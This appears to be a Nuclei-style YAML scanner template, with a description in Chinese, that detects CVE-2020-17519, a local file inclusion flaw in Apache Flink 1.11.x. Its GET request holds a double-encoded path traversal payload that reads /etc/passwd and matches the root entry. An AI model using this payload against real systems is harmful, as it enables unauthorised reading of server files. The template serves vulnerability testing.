id: CVE-2020-17519

info:
  name: Apache Flink - 本地文件包含(CVE-2020-17519)
  author: pdteam
  severity: high
  description: Flink 是一个开源的分布式流式处理框架(大数据),Apache Flink (1.11.0 1.11.1 1.11.2) 允许攻击者通过JobManager进程的REST接口读取JobManager本地文件系统上的任何文件.
  remediation: 更新官方补丁或更新最新版本.
  metadata:
    max-request: 1
  tags: flink

http:
  - method: GET
    path:
      - "{{BaseURL}}/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200